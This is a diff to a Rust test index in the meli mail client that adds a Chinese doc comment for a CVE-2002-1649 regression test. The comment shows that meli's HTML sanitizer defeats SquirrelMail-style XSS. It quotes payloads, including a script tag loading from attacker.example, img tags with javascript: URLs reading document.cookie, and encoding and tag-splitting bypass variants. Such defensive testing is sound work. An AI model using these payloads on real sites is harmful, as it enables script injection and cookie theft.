@@ -3224,3 +3224,78 @@ mod cve_2021_32055;
 #[cfg(test)]
 #[path = "CVE-2002-2086.rs"]
 mod cve_2002_2086;
+
+/// CVE-2002-1649（SquirrelMail < 1.2.3 webmail；`read_body.php` 的
+/// `magicHTML()` 清洗不足；CVSS v2 4.3）HTML 邮件跨站脚本 regression
+/// （issue #110，表 3 web/HTML 嵌入 of `SECURITY-CVE-RESEARCH.zh-CN.md`），
+/// 与已完成的同族后续版本 CVE-2002-2086（issue #109）共享原语但锚点不同：
+/// SquirrelMail 对邮件正文只做单遍标签匹配，于是两类正文载荷可在收件人
+/// 浏览器执行任意脚本——
+///
+/// 1. 本 CVE 特有的双尖括号（`<<`）注入变体带外部脚本源：
+///    `<<script src=//attacker.example/x.js><</script>`（第一个 `<` 被单遍
+///    匹配当作普通字符，剩下的 `<script src=…>` 逃逸并加载攻击者脚本）；
+/// 2. IMG 标签的 `javascript:` URL：
+///    `<img src="JaVaScRiPt:alert(document.cookie)">`（大小写混写）与
+///    `<img src=javascript:alert(1)>`（无引号）。
+///
+/// meli 等价面 mapped to 唯一一条 HTML 显示链：`meli/src/mail/view/
+/// html_render.rs` 的 [`sanitize`]（ammonia：标签白名单不含
+/// script/img/iframe/object/embed，`url_schemes` 仅 http/https/mailto，
+/// 危险 `href` 还会在 trim 后复检；`script` 属 `clean_content_tags`，连
+/// 内容一并删除）＋ [`render`]（html2text → 终端纯文本），调用点是
+/// `meli/src/mail/view/filters.rs` 的 `HtmlFilter::Builtin`。ammonia 用
+/// 规范 HTML5 分词器把输入**一次解析**成 DOM、过滤解析树、再转义序列化，
+/// 不存在 SquirrelMail 那种单遍字符串匹配可供双尖括号或 `<scr<script>ipt>`
+/// 片段欺骗；输出随后交给 html2text，链路上没有任何 JS 引擎。
+///
+/// [`cve_2002_1649`] 以六个分层 `#[test]` 锁定：
+///
+/// 1. 公告原形三条 ＋ 绕过狩猎变体（以本 CVE 的 IMG `javascript:` URL 与
+///    `<<script src=…>` 外部脚本原语为轴心：大小写混合、十进制/十六进制/
+///    命名实体编码 `&#106;avascript:`/`&#x6A;avascript:`/`&colon;`、Tab/LF/CR
+///    与前导 Cf 控制字符插入 scheme、无引号 img src、`onerror`/`onload` 事件
+///    处理器、外部 `src=` 脚本源（`script`/`iframe`/`object`/`embed`）、
+///    `<i<img>mg>`/`<img sr<script>c=…>`/`<scr<script>ipt>` 拆分重组、
+///    `vbscript:`/`data:`/`livescript:`/`mocha:` 伪协议，以及 IMG URL 的
+///    `a[href]` 等价形）逐条断言 issue 原文四条不变量：`sanitize()` 输出
+///    不含 `<img`、不含 `<script`，小写化后不含 `javascript:`；`render()`
+///    纯文本不含脚本源码 `alert(`。
+/// 2. 独立拷贝的 INERT_TAG_WHITELIST/INERT_ATTR_WHITELIST 逐标签扫描
+///    `sanitize` 输出，并锁定 `sanitize` 为不动点
+///    （`sanitize(sanitize(x)) == sanitize(x)`），排除二次解析重组。
+/// 3. 嵌入上下文探测：每条语料放进裸片段、`blockquote`、表格单元格、行内
+///    强调、完整文档五种上下文（各加倍），证明清洗是解析树上的结构操作、
+///    与包裹上下文无关。
+/// 4. 端到端：每条语料单独装进完整 RFC 822 邮件，经 `Envelope::from_bytes`
+///    / `Attachment` 解析取 HTML 正文，走与 `ViewFilter::new_html` 内置路径
+///    一致的 `sanitize` ＋ `render` 链；一封信带全部语料的组合文档另有一
+///    测试，断言渲染文本无 `alert(`、无 script/img 标记、无 `javascript:`，
+///    且良性 https/mailto 对照锚仍在——证明被拒绝的是 scheme/标签，而不是
+///    链接本身。
+/// 5. 外部脚本源专用锁：凡携带 `//attacker.example/x.js` 源标记的语料，
+///    `sanitize`/`render` 输出都不得残留该源，也不得出现
+///    `<script`/`<img`/`src=` 等可执行标签上下文（`script` 连内容与属性一并
+///    删除，`img`/`iframe`/`object`/`embed` 等元素整体剥离）。
+///
+/// 一处如实记录的观察（`non_markup_and_schemeless_forms_stay_inert`）：规范
+/// 解析会把非标签形（`< img …>`：`<` 后跟空格）与 raw-text 元素
+/// （`<xmp>`/`<noscript>`）的内容转义为**字面文本**，也会把 scheme 中间插入
+/// `U+0001`/`U+000B`/`U+200B`、反引号或前导 NUL 的 href 当无 scheme 相对引用
+/// 保留；这些情况下 `javascript:`/`alert(` 子串仍可能作为惰性文本出现，但既
+/// 非活标签也非可执行 URL（scheme 位置的控制字符在任何浏览器里同样解析
+/// 失败，也通不过 `url_scheme` 的 RFC 3986 文法、不在默认可启动 scheme 集合
+/// 里），meli 只把它当链接脚注文本显示。
+///
+/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——安全 Rust 的 ammonia
+/// 解析树白名单没有单遍字符串匹配可被双尖括号欺骗，`script` 的正文与 `src`
+/// 属性随元素一起删除，`img`/`iframe`/`object`/`embed` 等元素整体剥离，
+/// `javascript:`/`vbscript:`/`data:` 等 scheme 被白名单与 href 复检共同拒绝，
+/// html2text 只产生纯文本。
+///
+/// [`cve_2002_1649`]: self::cve_2002_1649
+/// [`sanitize`]: meli::mail::view::html_render::sanitize
+/// [`render`]: meli::mail::view::html_render::render
+#[cfg(test)]
+#[path = "CVE-2002-1649.rs"]
+mod cve_2002_1649;
